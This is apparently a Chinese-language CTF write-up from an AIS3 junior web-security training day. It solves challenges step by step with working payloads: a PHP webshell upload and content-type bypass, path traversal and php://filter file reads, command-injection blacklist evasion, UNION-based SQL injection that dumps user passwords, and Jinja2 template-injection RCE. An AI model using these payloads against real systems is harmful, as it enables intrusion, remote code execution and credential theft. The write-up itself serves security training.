---
title: AIS3 junior DAY2 上午 網頁安全
date: 2024-08-18 14:01:40
tags: writeup
categories: 2024 AIS3 junior
---

## 01 - Broken Access Control

### BAC01

隨便打一個名子login
查看url http://ctfd-ais3.crazyfirelee.tw:9001/user
將`user`改成`admin`
![image](https://hackmd.io/_uploads/B1X-5r3cA.png)
>AIS3_Junior{FirstBROKENAccessControl;)}

### BAC02

到`Product List`裡面觀察每個 `View Details`的 url 發現後面都有編號且唯獨少了4
將4打上去url試試看 http://ctfd-ais3.crazyfirelee.tw:9002/product/4
![image](https://hackmd.io/_uploads/HkwJiB39R.png)
點`buy`進去拿到flag
![image](https://hackmd.io/_uploads/Hk-fsS29R.png)
>AIS3_Junior{BroJustFoundBabyIDORVulnerability}

### BAC03
先用第一題的方法試試看 將url後面改成`admin`
![image](https://hackmd.io/_uploads/BJaS9L25C.png)
沒有辦法得到flag
換另一種方法 用linux的`curl`試試看
```
curl http://ctfd-ais3.crazyfirelee.tw:9003/admin
```
![image](https://hackmd.io/_uploads/SyWzoU35R.png)
>AIS3_Junior{BabyBRokenAccEssControoooooool}

## 02 - File Upload

### FIL01
先寫一個webshell
```php
<?php system($_GET['cmd']);?>
```
檔名用`.php`結尾
將webshell上傳
![image](https://hackmd.io/_uploads/rk0KOShqA.png)

將url改成 http://ctfd-ais3.crazyfirelee.tw:9011/uploads/a764c_108.160.138.201.php
利用剛才上傳的webshell 
將命令打在url後面`?cmd=ls ../`
結果如下圖*找到了FLAG*
![image](https://hackmd.io/_uploads/rye_PS3q0.png)

將命令改成`?cmd=cat ../FLAG`
![image](https://hackmd.io/_uploads/r13xKrn90.png)
>AIS3_Junior{FirstWEBSHELLXDDD}


### FIL02
先寫一個webshell
```php
<?php system($_GET['cmd']);?>
```
將檔名改成 `(隨你喜歡).jpg.php `
上傳時用brup將他攔下來
![image](https://hackmd.io/_uploads/Bkj2HBn5C.png)
將`Contect -Type `後面改成 `image/jpg`
`forward`的結果如圖
![image](https://hackmd.io/_uploads/B1IyESn50.png)

將url改成 http://ctfd-ais3.crazyfirelee.tw:9012/uploads/2a54e_108.160.138.201.php
利用剛才上傳的webshell 
將命令打在url後面`?cmd=ls ../`
結果如下圖*找到了FLAG*
![image](https://hackmd.io/_uploads/rye_PS3q0.png)

將命令改成`?cmd=cat ../FLAG`
![image](https://hackmd.io/_uploads/ryF6DH25A.png)
>AIS3_Junior{BabyUploadBypass}

## 03 - Local File Inclusion
### LFI01
照片很可疑
將照片url複製 http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&file=static/bitcoinCat.jpg

利用上課所教的`php://filter/read=convert.base64-encode/resource=index.php`

先把`static/bitcoinCat.jpg`給刪掉

把`php://filter/read=convert.base64-encode/resource=index.php`加進去url中 
改成 http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&file=php://filter/read=convert.base64-encode/resource=index.php

獲得一段base64加密過的東西![image](https://hackmd.io/_uploads/Bk9U6rn5A.png)

全選複製後去先上平台解密
![image](https://hackmd.io/_uploads/Hkv9aBnqC.png)

得到帳號:`admin` 密碼:`CATLOVEBITCOINMEOWMEOW`
得到flag

![image](https://hackmd.io/_uploads/HyWAaH2c0.png)
>AIS3_Junior{php://filter/BabyPHPLFI.b64decode()}

### LFI02
像FIL01和FIL02一樣 
```php
<?php system($_GET['cmd']);?>
```
將webshell檔案上傳
![image](https://hackmd.io/_uploads/H1XlhI3qA.png)

發現檔案在`tmp`底下 而tmp又在根目錄底下 
所以我們要利用../../../../ 跳到根目錄 
在將 `/tmp/a764c_108.160.138.201.php`貼到根目錄後面
像是這樣 http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=../../../../../tmp/a764c_108.160.138.201.php

接著再用`&cmd=ls` 獲得我們想要的檔案 `S3Cr3TFLAGGGGG`

![image](https://hackmd.io/_uploads/BkBv1Dh9C.png)

最後用`cat S3Cr3TFLAGGGGG` 將flag印出

![image](https://hackmd.io/_uploads/S17ngDnqR.png)
>AIS3_Junior{../../../../tmp/BADBAD.php?LFI=SUCCESS}

## 05 - Command Injection

### CMD01
先用`;ls` 查看有什麼東西

![image](https://hackmd.io/_uploads/Skk8Ew3qC.png)

發現有很多像flag的東西
先用cat印出`REAL_FLAG`
*發現是騙人的*

再去試試看`FLAG` 就出來了

![image](https://hackmd.io/_uploads/Hyas4D3cC.png)
>AIS3_Junior{BabyCommand;InjectionXDDDddddd}

### CMD02
想和上一題一樣 用`;ls` 結果沒有辦法
上網發現`;echo *` 也有一樣的效果
![image](https://hackmd.io/_uploads/H1s_CwhcC.png)
找到FLAG
用`;c\at F*`繞過黑名單 當作`cat FLAG` 得到flag
>AIS3_Junior{niceWordBL$()ACKListEvasion;)}

### CMD03
* 用`$(l${x}s|base64${IFS}-w${IFS}0)` 繞過黑名單 
* 用base64加密列出`ls`的東西
~~發現跟[Bonus] CMD06一樣~~
~~就用跟[Bonus] CMD06一樣的解法~~
* 用`$(ca${x}t${IFS}FLAG|base64${IFS}-w${IFS}0)`將flag以base64印出
![image](https://hackmd.io/_uploads/H1IZqkp5A.png)
`AIS3_Junior{BashOperato|rEvasion${IFS}SUCC|ESSFUL|:DDDDD}`



### [Bonus] CMD06
* 用`$(l${x}s|base64${IFS}-w${IFS}0)` 繞過黑名單 
* 用base64加密列出`ls`的東西
![image](https://hackmd.io/_uploads/HyGrPJTcA.png)

```
RkxBRwptYWluLnB5CnByZXN0YXJ0LnNoCnJlcXVpcmVtZW50cy50eHQKc3RhdGljCnRlbXBsYXRlcwp1d3NnaS5pbmkK
```
* 把上述用線上解密

![image](https://hackmd.io/_uploads/S1itwJa9A.png)

* 發現FLAG
* 用`$(ca${x}t${IFS}FLAG|base64${IFS}-w${IFS}0)`將flag以base64印出
![image](https://hackmd.io/_uploads/HkbxuJpq0.png)
*`QUlTM19KdW5pb3J7b3VvX2hpaGl9Cg==`用base64線上解密
![image](https://hackmd.io/_uploads/BkAmuk6q0.png)


## 06 - SQL Injection
### SQL1
用最簡單的SQL語法就可以拿到flag
~~好像簡單的CTF第一題SQL都可以用`admin'--`~~
帳號`admin'--` 密碼隨便填 
![image](https://hackmd.io/_uploads/B1FZku3cR.png)
>AIS3_Junior{SQL'InjectionXDorD=D_--_-}

### SQL2
參考網站: https://little-c-blog.coderbridge.io/2023/09/04/SQLi-lab-1/
先用`pp'UNION SELECT NULL#`去嘗試讓兩個表中有相同的columns
![image](https://hackmd.io/_uploads/BJZSV-a9A.png)
* 直到`pp' UNION SELECT NULL, NULL,NULL,NULL#`

![image](https://hackmd.io/_uploads/BkJj4Zp9A.png)

*列出所有table
1. mysql
2. information_schema
3. performance_schema
4. sys
5. arsenal
6. ApexPredators
```
pp' UNION SELECT group_concat(schema_name),group_concat(schema_name),group_concat(schema_name),group_concat(schema_name) from information_schema.schemata#
```
![image](https://hackmd.io/_uploads/HJzhUW69A.png)
![image](https://hackmd.io/_uploads/S1fMGYa5C.png)

* 發現網頁左上角剛好是第六個table的名稱 猜測可能是要到`ApexPredators`
* 試試看將我們所要的table:`ApexPredators`抓出來
* 接著繼續往下找ApexPredators的東西
```
pp' UNION SELECT group_concat(table_name),group_concat(table_name),group_concat(table_name),group_concat(table_name) from information_schema.tables where table_schema='ApexPredators' #
```
![image](https://hackmd.io/_uploads/BkoQ_-p5C.png)
* 發現有users
* 繼續往下找users的東西
```
pp' UNION SELECT group_concat(column_name),group_concat(column_name),group_concat(column_name),group_concat(column_name) from information_schema.columns where table_schema='ApexPredators' and table_name='users'#
```
![image](https://hackmd.io/_uploads/r1MidbaqC.png)
* 發現users底下有 id,isAdmin,password,username
* 印出id,isAdmin,password,username裡面的內容
```
pp' UNION SELECT id,username,password,isAdmin from ApexPredators.users#
```
![image](https://hackmd.io/_uploads/rkuIFZpc0.png)
* 發現只有`KubenBlisk`下面的值是1 ~~大膽假設是admin~~
帳號:KubenBlisk 密碼:BliskLeader#2024
登入後就得到flag
![image](https://hackmd.io/_uploads/rJFf5ba9A.png)


## 07 - Server-Side Template Injection

### STI01
參考資料:
* https://blog.1997sty.com/archives/5570
* https://ithelp.ithome.com.tw/articles/10244403

![image](https://hackmd.io/_uploads/S1h1AZ6qA.png)
裡面有:`.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('dir').read()`

* __class__抓到底下的str
* __base__抓到str上層的object
* __subclasses__() Object底下所有的東西，包含函式等[138]應該是popen object
* __init__ 初始化 object
* __globals__['popen'] 初始化object下的popen
('cat FLAG').read() popen執行cat FLAG並讀出來

* 將payload改為:
```
{{"".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('cat FLAG').read()}}
```
即可拿到flag
![image](https://hackmd.io/_uploads/r1PdRZacR.png)
> AIS3_Junior{.__JinjaTWOOOO.___["SSTI"]__.succ3ssXDD.__}

### STI02
參考資料: 
* https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#without-several-chars
* https://ithelp.ithome.com.tw/articles/10244403

![image](https://hackmd.io/_uploads/HJBl8z6q0.png)

從全域物件中獲取任何函數，可存取`__globals__.__builtins__`，實現RCE


payload:`{{request.application.__globals__.__builtins__.__import__('os').popen('cat FLAG').read()}}`

![image](https://hackmd.io/_uploads/SkjO8zTqC.png)
>AIS3_Junior{b4by__.filt3rEvasion.__Succ3ss}


